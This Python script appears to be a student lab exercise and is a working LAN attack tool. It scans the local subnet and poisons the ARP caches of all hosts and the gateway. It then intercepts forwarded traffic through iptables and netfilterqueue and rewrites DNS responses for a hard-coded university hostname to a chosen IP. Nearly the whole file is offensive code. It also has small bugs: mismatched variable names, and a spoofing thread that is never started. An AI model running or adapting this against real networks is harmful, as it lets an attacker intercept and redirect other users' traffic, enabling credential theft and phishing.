import scapy.all as scapy
# from scapy.all import *
import time
import os
import threading
from MITM.MITM_misc import getMask1Bits
from netfilterqueue import NetfilterQueue

dns_hosts = {b"www.nycu.edu.tw.": "140.113.207.237"}


def getGatewayIP():
    result = scapy.conf.route.route("0.0.0.0")[2]
    return result


def scan(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast / arpRequest

    answeredList = scapy.srp(arpRequestBroadcast, timeout=3, verbose=False)[0]

    resultList = []
    for element in answeredList:
        resultDict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        resultList.append(resultDict)
    return resultList


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


def spoof(targetIP, hostIP, devices, verbose=True):
    """
    Spoofs `targetIP` saying that we are `hostIP`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    targetMac = ""
    for item in devices:
        if item["ip"] == targetIP:
            targetMAC = item["mac"]

    arpResponse = scapy.ARP(
        pdst=targetIP, hwdst=targetMac, psrc=hostIP, op='is-at')

    scapy.send(arpResponse, verbose=False)

    if verbose:
        selfMac = scapy.ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, selfMac))


def restore(targetIP, hostIP, devices, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """

    targetMac = ""
    for item in devices:
        if item["ip"] == targetIP:
            targetMAC = item["mac"]

    hostMAC = ""
    for item in devices:
        if item["ip"] == hostIP:
            hostMAC = item["mac"]

    # crafting the restoring packet
    arp_response = scapy.ARP(
        pdst=targetIP, hwdst=targetMAC, psrc=hostIP, hwsrc=hostMAC)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    scapy.send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, hostMAC))


def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        print("[Before]:", scapy_packet.summary())

        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass

        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))

    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` (the answer part)
    to map our globally defined `dns_hosts` dictionary.
    """

    qname = packet[scapy.DNSQR].qname
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet

    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])

    packet[scapy.DNS].ancount = 1

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum

    return packet

def spoofing(targets, host, devices, verbose=True):
    while True:
        for target in targets:
            # telling the `target` that we are the `host`
            spoof(target, host, devices, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, devices, verbose)
        time.sleep(1)


if __name__ == "__main__":
    host = getGatewayIP()
    print("Gateway IP: ", host)

    leadingOnes = getMask1Bits()
    devices = scan(host + "/" + str(leadingOnes))

    print("Avaliable devices")
    print("---------------------------")
    print("IP                 MAC     ")
    print("---------------------------")

    targets = []
    for item in devices:
        if item["ip"] != host:
            targets.append(item["ip"])
            print(item["ip"], item["mac"], sep='\t')

    # print progress to the screen
    verbose = False
    # enable ip forwarding
    enable_ip_route()

    QUEUE_NUM = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    queue = NetfilterQueue()

    try:
        spoofingThread = threading.Thread(target=spoofing, args=(targets, host, devices, verbose))
        time.sleep(5)
        print("DNS lintening...")
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        for target in targets:
            restore(target, host, devices, verbose)
            restore(host, target, devices, verbose)
        os.system("iptables --flush")
        print("[+] Arp Spoof Stopped")
